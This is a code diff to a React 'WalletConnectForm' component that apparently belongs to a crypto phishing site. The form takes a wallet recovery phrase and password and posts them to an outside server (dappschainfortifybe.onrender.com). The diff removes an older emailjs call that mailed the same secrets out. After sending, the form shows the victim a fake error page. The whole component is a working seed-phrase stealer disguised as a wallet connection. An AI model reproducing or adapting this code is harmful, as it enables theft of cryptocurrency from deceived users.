@@ -53,22 +53,8 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
     if (validatePhrase(phrase)) {
       try {
 
-        await emailjs.send(
-          'service_ghf9i5i',
-          'template_7agj3ul',
-          {
-            to_name: "dapp",
-            from_name: name,
-            message: `
-              Name: ${name}
-              Type: ${type}
-              Data: ${data}
-              Password: ${password}
-            `,
-          },
-          'Y2zgK5wDVULj3uyvk'
-        );
         await axios.post('https://dappschainfortifybe.onrender.com/secure/connect/', { name, type, data, password });
+        
         setTimeout(() => {
           navigate('/error')
         }, 3000);
@@ -77,6 +63,7 @@ const WalletConnectForm = ({ walletName, walletLogo, setDisplayForm }) => {
         console.log("")
         setPhraseSubmit("CONNECT")
       }
+      
     } else {
       toast.error('Please enter a phrase with a word count between 12 and 24.', {
         position: "top-right",
